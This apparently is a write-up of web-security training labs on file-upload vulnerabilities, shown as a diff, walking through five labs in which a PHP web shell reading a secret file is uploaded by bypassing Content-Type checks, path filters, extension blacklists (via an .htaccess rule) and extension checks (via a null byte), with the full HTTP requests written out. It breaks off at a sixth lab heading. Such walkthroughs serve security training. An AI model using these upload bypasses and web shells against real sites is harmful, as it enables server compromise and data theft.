@@ -1,0 +1,117 @@
+Task 1:
+///Lab: Remote code execution via web shell upload///
+
+Open the site in burp, log in, and upload an avatar. Look at the requests in burp. Notice that after you uploaded your avatar pic when you get back to your account page, the site loads in your uploaded avatar.
+In the source code it looks like this:
+                           <p>
+                            <img src="/files/avatars/avatar.jpg" class=avatar>
+                            </p>
+This means the site saves your pic into the /file/avatars/ directory and then it directly loads in. We can use this. Create a php file ("To solve the lab, upload a basic PHP web shell")
+and copy this into the php file: 
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+Save it as xyz.php (i named it as secret.php) and upload this php file as your avatar. After you uploaded it you will see a GET /files/avatars/secret.php HTTP/2 request.
+In the response you will see what the secret file contains. Submit it, and the lab is solved.
+
+Task 2:
+///Lab: Web shell upload via Content-Type restriction bypass///
+
+Do exactly the same like in Task 1. When you try to upload your php file, you will get this error message:
+Sorry, file type application/x-php is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file.
+Look at the requests:
+POST /my-account/avatar HTTP/2
+Host: 0a6b00dc0468a1f98022582700ac000a.web-security-academy.net
+...
+...
+
+
+------geckoformboundary34b6ffb5a95bd08835f71e1c3bc1792a
+Content-Disposition: form-data; name="avatar"; filename="avatar.jpg"
+Content-Type: image/jpg
+
+...
+...
+And when you upload a php file:
+Content-Disposition: form-data; name="avatar"; filename="secret.php"
+Content-Type: application/x-php
+
+So Turn on intercept, and select your php file, click on upload, and when the POST request comes in change the Content-type to image/jpg and then forward the request. Turn off intercept, and you will have a new 
+GET /files/avatars/secret.php HTTP/2 request in ur http history. Submit the secret and you are done.
+
+Task 3:
+///Lab: Web shell upload via path traversal///
+
+Do the same in task 1. As you can see the site allowed you to upload the php file, but instead of executing the file it just returned the contents of the PHP file.
+To bypass this: find the POST /my-account/avatar request and at the middle of the request you will find this line:
+Content-Disposition: form-data; name="avatar"; filename="secret.php"
+Since its a path traversal lab change the filename value to ../secret.php. In the response: The file avatars/secret.php has been uploaded. This indicates us, that the server is not allowing us to use the '/'
+character, so url encode it to %2f:..%2fexploit.php. The response is: The file avatars/../exploit.php has been uploaded.
+Which is good. If you go back to http history you will find a GET /files/avatars/..%2fsecret.php HTTP/2 request, where is got 404 not found. So send this to repeater, modify the request:
+GET /files/avatars/../secret.php HTTP/2
+And you will get the secret.
+
+Task 4:
+///Lab: Web shell upload via extension blacklist bypass///
+
+Do the same like in task 1. When your try to upload your php file you will get this error message:
+Sorry, php files are not allowed Sorry, there was an error uploading your file.
+Look at the POST /my-account/avatar HTTP/2 request where the upload was succesful. In the response you will see this line:
+Server: Apache/2.4.41 (Ubuntu) This means we are communicating with an apache server. We can use this...
+Send the requuest where you failed to upload the php file to repeater:
+POST /my-account/avatar HTTP/2
+Host: 0acb008d039b4275822f070800870073.web-security-academy.net
+Cookie: session=4r5HHM8LmHWtCIZnT05WR3zQsIkThzzY
+...
+...
+
+------geckoformboundary48f9025c41d6cad0404623372f66c525
+Content-Disposition: form-data; name="avatar"; filename="secret.php"
+Content-Type: application/x-php
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+
+------geckoformboundary48f9025c41d6cad0404623372f66c525
+Content-Disposition: form-data; name="user"
+
+Modify the request like this:
+------geckoformboundary48f9025c41d6cad0404623372f66c525
+Content-Disposition: form-data; name="avatar"; filename=".htaccess"
+Content-Type: text/plain
+
+AddType application/x-httpd-php .l33t
+
+------geckoformboundary48f9025c41d6cad0404623372f66c525
+Content-Disposition: form-data; name="user"
+And send it.
+Rename your php file to xyz.l33t (to me its secret.l33t). Upload this file, and when you got the The "file avatars/secret.l33t has been uploaded" click on back to my account. Then check burps http history, and you 
+will get a new request:
+GET /files/avatars/secret.l33t HTTP/2 and in the response there is the secret key.
+
+Task 5:
+///Lab: Web shell upload via obfuscated file extension///
+
+Do the same like in task 1. When u try to upload the php file you will get this error:
+Sorry, only JPG & PNG files are allowed
+Sorry, there was an error uploading your file.
+
+To bypass this send this request to repeater and modify the request like this:
+POST /my-account/avatar HTTP/2
+Host: 0a4f00b7047443fb8185cf2b006500f5.web-security-academy.net
+...
+...
+
+------geckoformboundary7f8b666e9068c8f8e3bee8929b35d958
+Content-Disposition: form-data; name="avatar"; filename="secret.php%00.jpg"
+Content-Type: application/x-php
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+
+------geckoformboundary7f8b666e9068c8f8e3bee8929b35d958
+Content-Disposition: form-data; name="user"
+
+Send it and as you can see from the response:The file avatars/secret.php has been uploaded. We were successful.
+Now go back to your account, and check http history. If you get a GET /files/avatars/secret.php HTTP/2 request check the response, if not, then create one from GET /my-account (send it to repeater, and modify the 
+request).
+
+Task 6:
+///Lab: Remote code execution via polyglot web shell upload///
+
